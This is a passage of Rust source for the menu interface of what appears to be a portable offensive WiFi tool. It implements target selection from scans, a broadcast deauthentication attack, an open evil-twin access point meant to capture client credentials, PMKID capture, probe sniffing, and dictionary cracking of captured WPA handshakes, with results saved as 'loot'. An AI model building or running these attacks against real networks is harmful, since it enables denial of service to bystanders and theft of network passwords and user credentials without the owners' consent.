        let scan_result = self.fetch_wifi_scan();

        match scan_result {
            Ok(response) => {
                if response.networks.is_empty() {
                    return self.show_message("WiFi Scan", ["No networks found"]);
                }

                let networks = response.networks;

                loop {
                    // Build labels each loop so target marker updates after set
                    let mut labels = Vec::new();
                    for net in &networks {
                        let ssid = net.ssid.as_deref().unwrap_or("<hidden>");
                        let ssid_display = if ssid.len() > 10 {
                            format!("{}...", &ssid[..10])
                        } else {
                            ssid.to_string()
                        };
                        let signal = net
                            .signal_dbm
                            .map(|s| format!("{}dB", s))
                            .unwrap_or_default();
                        let ch = net.channel.map(|c| format!("c{}", c)).unwrap_or_default();
                        let bssid = net.bssid.as_deref().unwrap_or("");
                        let cur_target_bssid = self.config.settings.target_bssid.as_str();
                        let is_target = (!cur_target_bssid.is_empty() && cur_target_bssid == bssid)
                            || (!self.config.settings.target_network.is_empty()
                                && self.config.settings.target_network == ssid);
                        let target_marker = if is_target { "*" } else { " " };
                        labels.push(format!(
                            "{} {} {} {}",
                            target_marker, ssid_display, signal, ch
                        ));
                    }

                    let choice = self.choose_from_menu("Select Network", &labels)?;
                    let Some(idx) = choice else {
                        break;
                    };
                    let Some(network) = networks.get(idx) else {
                        continue;
                    };
                    if let Some(ssid) = network.ssid.as_deref().filter(|s| !s.is_empty()) {
                        let mut info = vec![format!("SSID: {}", ssid)];
                        if let Some(bssid) = network.bssid.as_deref() {
                            info.push(format!("BSSID: {}", bssid));
                        }
                        if let Some(ch) = network.channel {
                            info.push(format!("Channel: {}", ch));
                        }
                        if let Some(sig) = network.signal_dbm {
                            info.push(format!("Signal: {} dBm", sig));
                        }
                        info.push("".to_string());
                        info.push("Set this as target?".to_string());
                        self.show_message("Network", info.iter().map(|s| s.as_str()))?;

                        let confirm = self.choose_from_list(
                            "Set Target",
                            &["Yes".to_string(), "No".to_string()],
                        )?;
                        if confirm == Some(0) {
                            self.config.settings.target_network = ssid.to_string();
                            self.config.settings.target_bssid =
                                network.bssid.clone().unwrap_or_default();
                            self.config.settings.target_channel =
                                network.channel.unwrap_or(0) as u8;
                            let config_path = self.root.join("gui_conf.json");
                            let _ = self.config.save(&config_path);
                            let mut result_lines = vec![
                                format!("SSID: {}", ssid),
                                format!("Channel: {}", self.config.settings.target_channel),
                            ];
                            if self.config.settings.target_bssid.is_empty() {
                                result_lines.push("BSSID: (none)".to_string());
                                result_lines.push("Note: deauth needs BSSID".to_string());
                            } else {
                                result_lines
                                    .push(format!("BSSID: {}", self.config.settings.target_bssid));
                            }
                            self.show_message(
                                "Target Set",
                                result_lines.iter().map(|s| s.as_str()),
                            )?;
                        }
                    } else {
                        self.show_message("Wi-Fi", ["Hidden SSID - configure via CLI"])?;
                    }
                }
            }
            Err(e) => {
                self.show_message("WiFi Scan Error", [format!("{}", e)])?;
            }
        }

        Ok(())
    }

    fn launch_deauth_attack(&mut self) -> Result<()> {
        if !self.mode_allows_active("Deauth attack blocked in Stealth mode")? {
            return Ok(());
        }
        let active_interface = self.config.settings.active_network_interface.clone();
        let target_network = self.config.settings.target_network.clone();
        let target_bssid = self.config.settings.target_bssid.clone();
        let target_channel = self.config.settings.target_channel;

        if active_interface.is_empty() {
            return self.show_message(
                "Deauth Attack",
                [
                    "No WiFi interface set",
                    "",
                    "Run Hardware Detect",
                    "to configure interface",
                ],
            );
        }

        if !check_monitor_mode_support(&active_interface) {
            return self.show_message(
                "Hardware Error",
                [
                    "Interface does not",
                    "support monitor mode.",
                    "",
                    "External adapter required",
                ],
            );
        }

        // Validate we have all required target info
        if target_bssid.is_empty() {
            return self.show_message(
                "Deauth Attack",
                [
                    "No target BSSID set",
                    "Scan networks first",
                    "and select a target",
                ],
            );
        }

        if target_channel == 0 {
            return self.show_message(
                "Deauth Attack",
                [
                    "No target channel set",
                    "Scan networks first",
                    "and select a target",
                ],
            );
        }

        if active_interface.is_empty() {
            return self.show_message(
                "Deauth Attack",
                ["No active interface", "Set in Hardware Detect"],
            );
        }

        // Show attack configuration
        self.show_message(
            "Deauth Attack",
            [
                &format!(
                    "Target: {}",
                    if target_network.is_empty() {
                        &target_bssid
                    } else {
                        &target_network
                    }
                ),
                &format!("BSSID: {}", target_bssid),
                &format!("Channel: {}", target_channel),
                &format!("Interface: {}", active_interface),
                "Duration: 120s",
                "Press SELECT to start",
            ],
        )?;
        let confirm = self.choose_from_list(
            "Start Deauth?",
            &["Start".to_string(), "Cancel".to_string()],
        )?;
        if confirm != Some(0) {
            return Ok(());
        }

        // Show progress stages for 120 second attack
        let progress_stages = vec![
            (0, "Killing processes..."),
            (2, "Monitor mode enabled"),
            (5, "Setting channel..."),
            (8, "Starting capture..."),
            (10, "Sending deauth burst"),
            (15, "Attack in progress..."),
            (30, "Monitoring for handshake"),
            (45, "Deauth burst sent..."),
            (60, "Halfway complete..."),
            (75, "Still capturing..."),
            (90, "Checking for handshake"),
            (100, "Attack continuing..."),
            (110, "Finalizing capture..."),
            (115, "Stopping monitor mode"),
        ];

        // Show initial message
        self.show_progress(
            "Deauth Attack",
            [
                &format!(
                    "Target: {}",
                    if target_network.is_empty() {
                        &target_bssid
                    } else {
                        &target_network
                    }
                ),
                &format!("Channel: {} | {}", target_channel, active_interface),
                "Preparing attack...",
            ],
        )?;

        // Launch attack in background thread while showing progress
        use std::sync::{Arc, Mutex};
        use std::thread;
        use std::time::Duration;

        let core = self.core.clone();
        let bssid = target_bssid.clone();
        let ssid = if target_network.is_empty() {
            None
        } else {
            Some(target_network.clone())
        };
        let channel = target_channel;
        let iface = active_interface.clone();

        let result = Arc::new(Mutex::new(None));
        let result_clone = Arc::clone(&result);

        // Spawn attack thread
        thread::spawn(move || {
            let command = Commands::Wifi(WifiCommand::Deauth(WifiDeauthArgs {
                bssid,
                ssid,
                interface: iface,
                channel,
                duration: 120,    // 2 minutes for better handshake capture
                packets: 64,      // More packets per burst
                client: None,     // Broadcast to all clients
                continuous: true, // Keep sending deauth throughout
                interval: 1,      // 1 second between bursts
            }));

            let r = core.dispatch(command);
            *result_clone.lock()
                .map_err(|e| anyhow::anyhow!("Result mutex poisoned: {}", e))
                .unwrap_or_else(|_| panic!("Failed to lock result mutex")) = Some(r);
        });

        // Show progress updates while attack runs (120 seconds)
        let attack_duration = 120u64;
        let start = std::time::Instant::now();
        let mut cancelled = false;
        let mut last_displayed_elapsed: u64 = u64::MAX; // Track to avoid redundant redraws

        loop {
            let elapsed = start.elapsed().as_secs();

            // Check for cancel button press
            match self.check_attack_cancel("Deauth")? {
                CancelAction::Continue => {}
                CancelAction::GoBack => {
                    cancelled = true;
                    break;
                }
                CancelAction::GoMainMenu => {
                    cancelled = true;
                    self.menu_state.home();
                    break;
                }
            }

            // Check if attack completed
            if result.lock()
                .map_err(|e| anyhow::anyhow!("Result mutex poisoned: {}", e))?
                .is_some() {
                break;
            }

            // Only redraw when elapsed seconds changed
            if elapsed != last_displayed_elapsed {
                last_displayed_elapsed = elapsed;

                // Update stage message if we've reached a new stage
                let mut current_stage_msg = "Attack in progress...";
                for (time, msg) in &progress_stages {
                    if elapsed >= *time {
                        current_stage_msg = msg;
                    } else {
                        break;
                    }
                }

                let overlay = self.stats.snapshot();
                let message = if elapsed < attack_duration {
                    format!("{}s/{}s {}", elapsed, attack_duration, current_stage_msg)
                } else {
                    "Finalizing...".to_string()
                };
                self.display.draw_progress_dialog(
                    "Deauth [LEFT=Cancel]",
                    &message,
                    (elapsed as f32 / attack_duration as f32).min(1.0) * 100.0,
                    &overlay,
                )?;
            }

            thread::sleep(Duration::from_millis(50));
        }

        // If cancelled, show message and return
        if cancelled {
            self.show_message(
                "Deauth Cancelled",
                [
                    "Attack stopped early",
                    "",
                    "Partial results may be",
                    "in loot/Wireless/",
                ],
            )?;
            return Ok(());
        }

        // Get result
        let attack_result = result.lock()
            .map_err(|e| anyhow::anyhow!("Result mutex poisoned: {}", e))?
            .take()
            .ok_or_else(|| anyhow::anyhow!("Attack result not available"))?;

        match attack_result {
            Ok((msg, data)) => {
                let mut result_lines = vec![msg];

                if let Some(captured) = data.get("handshake_captured").and_then(|v| v.as_bool()) {
                    if captured {
                        result_lines.push("HANDSHAKE CAPTURED!".to_string());
                        if let Some(hf) = data.get("handshake_file").and_then(|v| v.as_str()) {
                            result_lines.push(format!(
                                "File: {}",
                                Path::new(hf).file_name()
                                    .and_then(|n| n.to_str())
                                    .unwrap_or("handshake.cap")
                            ));
                        }
                    } else {
                        result_lines.push("No handshake detected".to_string());
                    }
                }

                if let Some(packets) = data.get("total_packets_sent").and_then(|v| v.as_u64()) {
                    result_lines.push(format!("Packets: {}", packets));
                }

                if let Some(bursts) = data.get("deauth_bursts").and_then(|v| v.as_u64()) {
                    result_lines.push(format!("Bursts: {}", bursts));
                }

                if let Some(log) = data.get("log_file").and_then(|v| v.as_str()) {
                    result_lines.push(format!(
                        "Log: {}",
                        Path::new(log).file_name()
                            .and_then(|n| n.to_str())
                            .unwrap_or("log.txt")
                    ));
                }

                result_lines.push("Check Loot > Wireless".to_string());

                self.show_message("Deauth Complete", result_lines.iter().map(|s| s.as_str()))?;
            }
            Err(e) => {
                self.show_message("Deauth Error", [format!("{}", e)])?;
            }
        }

        Ok(())
    }

    fn connect_known_network(&mut self) -> Result<()> {
        // Fetch saved WiFi profiles
        let profiles = match self.fetch_wifi_profiles() {
            Ok(p) => p,
            Err(e) => {
                return self.show_message(
                    "Connect",
                    ["Failed to load profiles", "", &format!("{}", e)],
                );
            }
        };

        if profiles.is_empty() {
            return self.show_message(
                "Connect",
                [
                    "No saved profiles",
                    "",
                    "Profiles are stored in",
                    "wifi/profiles/*.json",
                    "",
                    "Or scan networks and",
                    "save credentials",
                ],
            );
        }

        // Let user select a profile
        let profile_names: Vec<String> = profiles.iter().map(|p| p.ssid.clone()).collect();
        let choice = self.choose_from_list("Select Network", &profile_names)?;

        let Some(idx) = choice else {
            return Ok(());
        };

        let selected = &profiles[idx];
        self.connect_named_profile(&selected.ssid)?;

        Ok(())
    }

    fn launch_evil_twin(&mut self) -> Result<()> {
        if !self.mode_allows_active("Evil Twin blocked in Stealth mode")? {
            return Ok(());
        }
        // Check if we have a target set
        let target_network = self.config.settings.target_network.clone();
        let target_bssid = self.config.settings.target_bssid.clone();
        let target_channel = self.config.settings.target_channel;
        let mut attack_interface = self.config.settings.active_network_interface.clone();

        if target_network.is_empty() || target_bssid.is_empty() {
            return self.show_message(
                "Evil Twin",
                [
                    "No target network set",
                    "",
                    "First scan networks and",
                    "select 'Set as Target'",
                ],
            );
        }

        if attack_interface.is_empty() {
            // Let user pick a wireless interface if none set
            if let Some(choice) = self.choose_wifi_interface("Pick WiFi interface")? {
                attack_interface = choice;
                self.config.settings.active_network_interface = attack_interface.clone();
                let _ = self.config.save(&self.root.join("gui_conf.json"));
            } else {
                return Ok(());
            }
        }

        if !check_monitor_mode_support(&attack_interface) {
            return self.show_message(
                "Hardware Error",
                [
                    "Interface does not",
                    "support monitor mode.",
                    "",
                    "External adapter required",
                ],
            );
        }

        // Show attack configuration
        self.show_message(
            "Evil Twin Attack",
            [
                &format!("SSID: {}", target_network),
                &format!("Ch: {} Iface: {}", target_channel, attack_interface),
                "",
                "Creates fake AP with same",
                "SSID to capture client",
                "credentials.",
                "",
                "Press SELECT to start",
            ],
        )?;

        // Confirm start
        let options = vec!["Start Attack".to_string(), "Cancel".to_string()];
        let choice = self.choose_from_list("Confirm", &options)?;

        if choice != Some(0) {
            return Ok(());
        }

        // Execute evil twin via core with cancel support
        use rustyjack_core::{Commands, WifiCommand, WifiEvilTwinArgs};

        let cmd = Commands::Wifi(WifiCommand::EvilTwin(WifiEvilTwinArgs {
            ssid: target_network.clone(),
            target_bssid: Some(target_bssid),
            channel: target_channel,
            interface: attack_interface.clone(),
            duration: 300, // 5 minutes
            open: true,
        }));

        let result = self.dispatch_cancellable("Evil Twin", cmd, 300)?;

        let Some((msg, data)) = result else {
            return Ok(()); // Cancelled
        };

        let mut lines = Vec::new();

        // Check status
        let status = data
            .get("status")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown");

        if status == "completed" {
            lines.push("Attack Complete".to_string());
        } else if status == "failed" {
            lines.push("Attack Failed".to_string());
            lines.push(msg);
        } else {
            lines.push(msg);
        }

        // Show stats
        if let Some(duration) = data.get("attack_duration_secs").and_then(|v| v.as_u64()) {
            let mins = duration / 60;
            let secs = duration % 60;
            lines.push(format!("Duration: {}m {}s", mins, secs));
        }

        if let Some(clients) = data.get("clients_connected").and_then(|v| v.as_u64()) {
            lines.push(format!("Clients: {}", clients));
        }
        if let Some(hs) = data.get("handshakes_captured").and_then(|v| v.as_u64()) {
            lines.push(format!("Handshakes: {}", hs));
        }
        if let Some(creds) = data.get("credentials_captured").and_then(|v| v.as_u64()) {
            lines.push(format!("Creds: {}", creds));
        }

        // Show loot location
        if let Some(dir) = data.get("loot_directory").and_then(|v| v.as_str()) {
            let short_dir = dir.split('/').last().unwrap_or(dir);
            lines.push(format!("Loot: {}", short_dir));
        }

        self.show_message("Evil Twin", lines.iter().map(|s| s.as_str()))?;

        Ok(())
    }

    fn launch_probe_sniff(&mut self) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();

        if active_interface.is_empty() {
            return self.show_message(
                "Probe Sniff",
                [
                    "No WiFi interface set",
                    "",
                    "Run Hardware Detect",
                    "to configure interface",
                ],
            );
        }

        if !check_monitor_mode_support(&active_interface) {
            return self.show_message(
                "Hardware Error",
                [
                    "Interface does not",
                    "support monitor mode.",
                    "",
                    "External adapter required",
                ],
            );
        }

        // Duration selection
        let durations = vec![
            "30 seconds".to_string(),
            "1 minute".to_string(),
            "5 minutes".to_string(),
            "Indefinite".to_string(),
        ];
        let dur_choice = self.choose_from_list("Sniff Duration", &durations)?;

        let duration_secs = match dur_choice {
            Some(0) => 30,
            Some(1) => 60,
            Some(2) => 300,
            Some(3) => INDEFINITE_SECS,
            _ => return Ok(()),
        };

        if duration_secs == INDEFINITE_SECS {
            self.show_message(
                "Probe Sniff",
                [
                    "Running indefinitely.",
                    "Press LEFT/Main Menu",
                    "to stop. Elapsed shown.",
                ],
            )?;
        }

        use rustyjack_core::{Commands, WifiCommand, WifiProbeSniffArgs};

        let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
            interface: active_interface,
            duration: duration_secs,
            channel: 0, // hop channels
        }));

        let result = self.dispatch_cancellable("Probe Sniff", cmd, duration_secs as u64)?;

        let Some((msg, data)) = result else {
            return Ok(()); // Cancelled
        };

        let mut lines = vec![msg];

        if let Some(probes) = data.get("total_probes").and_then(|v| v.as_u64()) {
            lines.push(format!("Probes: {}", probes));
        }
        if let Some(clients) = data.get("unique_clients").and_then(|v| v.as_u64()) {
            lines.push(format!("Clients: {}", clients));
        }
        if let Some(networks) = data.get("unique_networks").and_then(|v| v.as_u64()) {
            lines.push(format!("Networks: {}", networks));
        }

        // Show top probed networks
        if let Some(top) = data.get("top_networks").and_then(|v| v.as_array()) {
            lines.push("".to_string());
            lines.push("Top Networks:".to_string());
            for net in top.iter().take(3) {
                if let Some(ssid) = net.get("ssid").and_then(|v| v.as_str()) {
                    let count = net.get("probe_count").and_then(|v| v.as_u64()).unwrap_or(0);
                    lines.push(format!("  {} ({})", ssid, count));
                }
            }
        }

        self.show_message("Probe Sniff Done", lines.iter().map(|s| s.as_str()))?;

        Ok(())
    }

    fn launch_pmkid_capture(&mut self) -> Result<()> {
        if !self.mode_allows_active("PMKID capture blocked in Stealth mode")? {
            return Ok(());
        }
        let target_network = self.config.settings.target_network.clone();
        let target_bssid = self.config.settings.target_bssid.clone();
        let target_channel = self.config.settings.target_channel;
        let active_interface = self.config.settings.active_network_interface.clone();

        if active_interface.is_empty() {
            return self.show_message(
                "PMKID Capture",
                ["No WiFi interface set", "", "Run Hardware Detect first"],
            );
        }

        if !check_monitor_mode_support(&active_interface) {
            return self.show_message(
                "Hardware Error",
                [
                    "Interface does not",
                    "support monitor mode.",
                    "",
                    "External adapter required",
                ],
            );
        }

        // Option to target specific network or passive capture
        let options = vec![
            if target_network.is_empty() {
                "Passive Capture".to_string()
            } else {
                format!("Target: {}", target_network)
            },
            "Passive (any network)".to_string(),
            "Indefinite (manual stop)".to_string(),
            "Cancel".to_string(),
        ];

        let choice = self.choose_from_menu("PMKID Mode", &options)?;

        let (use_target, duration) = match choice {
            Some(0) if !target_network.is_empty() => (true, 30),
            Some(1) | Some(0) => (false, 60),
            Some(2) => (false, INDEFINITE_SECS),
            _ => return Ok(()),
        };

        if duration == INDEFINITE_SECS {
            self.show_message(
                "PMKID Capture",
                [
                    "Running indefinitely.",
                    "Press LEFT/Main Menu",
                    "to stop. Elapsed shown.",
                ],
            )?;
        }

        use rustyjack_core::{Commands, WifiCommand, WifiPmkidArgs};

        let cmd = Commands::Wifi(WifiCommand::PmkidCapture(WifiPmkidArgs {
            interface: active_interface,
            bssid: if use_target { Some(target_bssid) } else { None },
            ssid: if use_target {
                Some(target_network)
            } else {
                None
            },
            channel: if use_target { target_channel } else { 0 },
            duration,
        }));

        let result = self.dispatch_cancellable("PMKID Capture", cmd, duration as u64)?;

        let Some((msg, data)) = result else {
            return Ok(()); // Cancelled
        };

        let mut lines = vec![msg];

        if let Some(count) = data.get("pmkids_captured").and_then(|v| v.as_u64()) {
            if count > 0 {
                lines.push(format!("Captured: {} PMKIDs", count));
                lines.push("".to_string());
                lines.push("Auto-cracking...".to_string());

                // If PMKID was captured, trigger auto-crack
                if let Some(_hashcat) = data.get("hashcat_format").and_then(|v| v.as_str()) {
                    lines.push("Hash saved for cracking".to_string());
                }
            } else {
                lines.push("No PMKIDs found".to_string());
                lines.push("Try different network".to_string());
            }
        }

        self.show_message("PMKID Result", lines.iter().map(|s| s.as_str()))?;

        Ok(())
    }

    fn launch_crack_handshake(&mut self) -> Result<()> {
        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message(
                "Crack",
                [
                    "Handshake cracking",
                    "is available on Linux",
                    "targets only.",
                ],
            );
        }

        #[cfg(target_os = "linux")]
        {
            let loot_dir = self.root.join("loot/Wireless");

            if !loot_dir.exists() {
                return self.show_message(
                    "Crack",
                    [
                        "No handshakes found",
                        "",
                        "Capture a handshake",
                        "using Deauth Attack",
                        "or PMKID Capture first",
                    ],
                );
            }

            let mut handshake_files: Vec<(String, std::path::PathBuf)> = Vec::new();
            fn scan_dir(dir: &std::path::Path, files: &mut Vec<(String, std::path::PathBuf)>) {
                if let Ok(entries) = std::fs::read_dir(dir) {
                    for entry in entries.flatten() {
                        let path = entry.path();
                        if path.is_dir() {
                            scan_dir(&path, files);
                        } else if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                            if name.starts_with("handshake_export_") && name.ends_with(".json") {
                                let display_name = if let Some(parent) = path.parent() {
                                    if let Some(parent_name) = parent.file_name() {
                                        format!(
                                            "{}/{}",
                                            parent_name.to_string_lossy(),
                                            path.file_name().unwrap_or_default().to_string_lossy()
                                        )
                                    } else {
                                        path.file_name()
                                            .unwrap_or_default()
                                            .to_string_lossy()
                                            .to_string()
                                    }
                                } else {
                                    path.file_name()
                                        .unwrap_or_default()
                                        .to_string_lossy()
                                        .to_string()
                                };
                                files.push((display_name, path));
                            }
                        }
                    }
                }
            }
            scan_dir(&loot_dir, &mut handshake_files);

            if handshake_files.is_empty() {
                return self.show_message(
                    "Crack",
                    [
                        "No handshake exports",
                        "found in loot/",
                        "",
                        "Capture a handshake",
                        "first. Native cracker",
                        "uses JSON exports.",
                    ],
                );
            }

            let display_names: Vec<String> = handshake_files
                .iter()
                .map(|(name, _)| name.clone())
                .collect();
            let choice = self.choose_from_menu("Select Handshake", &display_names)?;

            let Some(idx) = choice else {
                return Ok(());
            };

            let (_selected_name, file_path) = &handshake_files[idx];
            let bundle = self.load_handshake_bundle(file_path)?;

            let dictionaries = self.available_dictionaries(&bundle.ssid)?;
            let labels: Vec<String> = dictionaries.iter().map(|d| d.label()).collect();

            let dict_choice = self.choose_from_menu("Dictionary", &labels)?;
            let Some(selection) = dict_choice else {
                return Ok(());
            };
            let dictionary = dictionaries[selection].clone();

            let result = self.crack_handshake_with_progress(bundle, dictionary)?;

            let mut lines = Vec::new();
            lines.push(format!(
                "Attempts: {}/{}",
                result.attempts, result.total_attempts
            ));
            lines.push(format!("Elapsed: {:.1}s", result.elapsed.as_secs_f32()));
            if let Some(p) = result.password {
                lines.push("".to_string());
                lines.push("PASSWORD FOUND!".to_string());
                lines.push(p);
            } else if result.cancelled {
                lines.push("Cancelled before finish".to_string());
            } else {
                lines.push("No match found".to_string());
                lines.push("Try another dictionary".to_string());
            }

            self.show_message("Crack Result", lines.iter().map(|s| s.as_str()))?;
            Ok(())
        }
    }

    #[cfg(target_os = "linux")]
    fn load_handshake_bundle(&self, path: &Path) -> Result<HandshakeBundle> {
        let data = fs::read(path)
            .with_context(|| format!("reading handshake export {}", path.display()))?;
        let bundle: HandshakeBundle =
            serde_json::from_slice(&data).with_context(|| format!("parsing {}", path.display()))?;
        Ok(bundle)
    }

    #[cfg(target_os = "linux")]
    fn load_wordlist(&self, path: &Path) -> Result<Vec<String>> {
        let file =
            File::open(path).with_context(|| format!("opening wordlist {}", path.display()))?;
        let reader = BufReader::new(file);
        let mut passwords = Vec::new();
        for line in reader.lines() {
            let line = line.unwrap_or_default();
            let pw = line.trim();
            if pw.len() >= 8 && pw.len() <= 63 {
                passwords.push(pw.to_string());
            }
        }
        Ok(passwords)
    }

    #[cfg(target_os = "linux")]
    fn count_wordlist(&self, path: &Path) -> usize {
        File::open(path)
            .ok()
            .map(|file| {
                BufReader::new(file)
                    .lines()
                    .filter_map(|l| l.ok())
                    .filter(|pw| {
                        let len = pw.trim().len();
                        len >= 8 && len <= 63
                    })
                    .count()
            })
            .unwrap_or(0)
    }

    #[cfg(target_os = "linux")]
    fn available_dictionaries(&self, ssid: &str) -> Result<Vec<DictionaryOption>> {
        let base = self.root.join("wordlists");
        let quick_total =
            (generate_common_passwords().len() + generate_ssid_passwords(ssid).len()) as u64;
        let ssid_total = generate_ssid_passwords(ssid).len() as u64;

        let mut options = vec![
            DictionaryOption::Quick { total: quick_total },
            DictionaryOption::SsidPatterns { total: ssid_total },
        ];

        let bundled = [
            ("WiFi common", base.join("wifi_common.txt")),
            ("Top passwords", base.join("common_top.txt")),
        ];
        for (label, path) in bundled {
            let count = self.count_wordlist(&path) as u64;
            if count > 0 {
                options.push(DictionaryOption::Bundled {
                    name: label.to_string(),
                    path,
                    total: count,
                });
            }
        }

        Ok(options)
    }

    #[cfg(target_os = "linux")]
    fn crack_handshake_with_progress(
        &mut self,
        bundle: HandshakeBundle,
        dictionary: DictionaryOption,
    ) -> Result<CrackOutcome> {
        use std::thread;

        let passwords = match &dictionary {
            DictionaryOption::Quick { .. } => {
                let mut list = generate_common_passwords();
                list.extend(generate_ssid_passwords(&bundle.ssid));
                list
            }
            DictionaryOption::SsidPatterns { .. } => generate_ssid_passwords(&bundle.ssid),
            DictionaryOption::Bundled { path, .. } => self.load_wordlist(path)?,
        };

        if passwords.is_empty() {
            return Err(anyhow::anyhow!("Selected dictionary is empty"));
        }

        let total_attempts = passwords.len() as u64;

        let mut cracker =
            WpaCracker::new(bundle.handshake.clone(), &bundle.ssid).with_config(CrackerConfig {
                // Update UI on every attempt so the progress bar moves consistently
                progress_interval: 1,
                max_attempts: 0,
                throttle_interval: 200,
                threads: 1,
            });
        let stop_flag = cracker.stop_handle();

        let (tx, rx) = mpsc::channel();
        thread::spawn(move || {
            let mut cb = |p: CrackProgress| {
                let _ = tx.send(CrackUpdate::Progress {
                    attempts: p.attempts,
                    total: total_attempts,
                    rate: p.rate,
                    current: p.current.clone(),
                });
            };

            let res = cracker.crack_passwords_with_progress(
                &passwords,
                Some(total_attempts),
                Some(&mut cb),
            );

            let final_attempts = cracker.attempts();
            let _ = match res {
                Ok(CrackResult::Found(pw)) => tx.send(CrackUpdate::Done {
                    password: Some(pw),
                    attempts: final_attempts,
                    total: total_attempts,
                    cancelled: false,
                }),
                Ok(CrackResult::Exhausted { attempts }) => tx.send(CrackUpdate::Done {
                    password: None,
                    attempts,
                    total: total_attempts,
                    cancelled: false,
                }),
                Ok(CrackResult::Stopped { attempts }) => tx.send(CrackUpdate::Done {
                    password: None,
                    attempts,
                    total: total_attempts,
                    cancelled: true,
                }),
                Err(e) => tx.send(CrackUpdate::Error(e.to_string())),
            };
        });

        let mut attempts = 0u64;
        let mut current = String::new();
        let mut rate = 0.0f32;
        let mut finished: Option<CrackOutcome> = None;
        let started = Instant::now();

        // Initial draw so user sees 0/N
        self.draw_crack_progress(attempts, total_attempts, rate, &current)?;

        loop {
            match rx.try_recv() {
                Ok(update) => match update {
                    CrackUpdate::Progress {
                        attempts: a,
                        total,
                        rate: r,
                        current: c,
                    } => {
                        attempts = a;
                        rate = r;
                        current = c;
                        self.draw_crack_progress(attempts, total, rate, &current)?;
                    }
                    CrackUpdate::Done {
                        password,
                        attempts: a,
                        total,
                        cancelled,
                    } => {
                        // draw final state before exiting
                        self.draw_crack_progress(a, total, rate, &current)?;
                        finished = Some(CrackOutcome {
                            password,
                            attempts: a,
                            total_attempts: total,
                            elapsed: started.elapsed(),
                            cancelled,
                        });
                    }
                    CrackUpdate::Error(e) => {
                        self.show_message("Crack", [e.clone()])?;
                        return Err(anyhow!(e));
                    }
                },
                Err(TryRecvError::Disconnected) => {
                    finished = Some(CrackOutcome {
                        password: None,
                        attempts,
                        total_attempts,
                        elapsed: started.elapsed(),
                        cancelled: true,
                    });
                }
                Err(TryRecvError::Empty) => {}
            }

            if finished.is_some() {
                break;
            }

            if let Some(button) = self.buttons.try_read()? {
                match self.map_button(button) {
                    ButtonAction::Back | ButtonAction::MainMenu => {
                        // Confirm cancel
                        let confirm = self.choose_from_list(
                            "Cancel crack?",
                            &["Yes".to_string(), "No".to_string()],
                        )?;
                        if confirm == Some(0) {
                            stop_flag.store(true, std::sync::atomic::Ordering::Relaxed);
                        }
                    }
                    ButtonAction::Reboot => self.confirm_reboot()?,
                    _ => {}
                }
            }

            self.draw_crack_progress(attempts, total_attempts, rate, &current)?;
            thread::sleep(Duration::from_millis(350));
        }

        Ok(finished.unwrap_or(CrackOutcome {
            password: None,
            attempts,
            total_attempts,
            elapsed: started.elapsed(),
            cancelled: true,
        }))
    }

    #[cfg(target_os = "linux")]
    fn draw_crack_progress(
        &mut self,
        attempts: u64,
        total: u64,
        rate: f32,
        current: &str,
    ) -> Result<()> {
        let pct = if total > 0 {
            (attempts as f32 / total as f32 * 100.0).min(100.0)
        } else {
            0.0
        };
        let message = format!(
            "{} / {} tried | {:.1}/s | {}",
            attempts,
            total,
            rate,
            shorten_for_display(current, 14)
        );
        let status = self.status_overlay();
        self.display
            .draw_progress_dialog("Crack Handshake", &message, pct, &status)?;
        Ok(())
    }

    /// Install WiFi drivers for USB dongles
    /// Keeps user on screen until installation completes or fails
    fn install_wifi_drivers(&mut self) -> Result<()> {
        use std::fs;
        use std::process::{Command, Stdio};

        // Status file used by the driver installer script
        let status_file = Path::new("/tmp/rustyjack_wifi_status");
        let result_file = Path::new("/tmp/rustyjack_wifi_result.json");
        let script_path = self.root.join("scripts/wifi_driver_installer.sh");

        // Check if script exists
        if !script_path.exists() {
            return self.show_message(
                "Driver Install",
                [
                    "Installer script not found",
                    "",
                    "Missing:",
                    "scripts/wifi_driver_installer.sh",
                    "",
                    "Please reinstall RustyJack",
                ],
            );
        }

        // Initial screen - explain what we're doing
        self.show_message(
            "WiFi Driver Install",
            [
                "This will scan for USB WiFi",
                "adapters and install any",
                "required drivers.",
                "",
                "Internet required for",
                "driver downloads.",
                "",
                "Press SELECT to continue",
            ],
        )?;

        // Confirm
        let options = vec!["Start Scan".to_string(), "Cancel".to_string()];
        let choice = self.choose_from_list("Install Drivers?", &options)?;

        if choice != Some(0) {
            return Ok(());
        }

        // Clear old status files
        let _ = fs::remove_file(status_file);
        let _ = fs::remove_file(result_file);

        // Show initial scanning message
        self.show_progress("WiFi Driver", ["Scanning for USB WiFi...", "Please wait"])?;

        // Run the installer script
        let mut child = match Command::new("bash")
            .arg(&script_path)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
        {
            Ok(c) => c,
            Err(e) => {
                return self.show_message(
                    "Driver Error",
                    ["Failed to start installer", "", &format!("{}", e)],
                );
            }
        };

        // Monitor progress
        let mut last_status = String::new();
        let mut ticks = 0;

        loop {
            // Check if process finished
            match child.try_wait() {
                Ok(Some(status)) => {
                    // Process finished - check result
                    let exit_code = status.code().unwrap_or(-1);

                    // Read final result
                    if let Ok(result_json) = fs::read_to_string(result_file) {
                        if let Ok(result) = serde_json::from_str::<Value>(&result_json) {
                            let status = result
                                .get("status")
                                .and_then(|v| v.as_str())
                                .unwrap_or("UNKNOWN");
                            let details =
                                result.get("details").and_then(|v| v.as_str()).unwrap_or("");
                            let interfaces = result.get("interfaces").and_then(|v| v.as_array());

                            match status {
                                "SUCCESS" => {
                                    let mut lines =
                                        vec!["Driver installed!".to_string(), "".to_string()];
                                    if let Some(ifaces) = interfaces {
                                        lines.push("Available interfaces:".to_string());
                                        for iface in ifaces {
                                            if let Some(name) = iface.as_str() {
                                                lines.push(format!("  - {}", name));
                                            }
                                        }
                                    }
                                    lines.push("".to_string());
                                    lines.push("Ready to use!".to_string());

                                    return self.show_message(
                                        "Driver Success",
                                        lines.iter().map(|s| s.as_str()),
                                    );
                                }
                                "REBOOT_REQUIRED" => {
                                    return self.show_message(
                                        "Reboot Required",
                                        [
                                            "Driver installed but",
                                            "reboot is required.",
                                            "",
                                            "Please restart the",
                                            "device to complete",
                                            "installation.",
                                            "",
                                            "Press KEY3 to reboot",
                                        ],
                                    );
                                }
                                "NO_DEVICES" => {
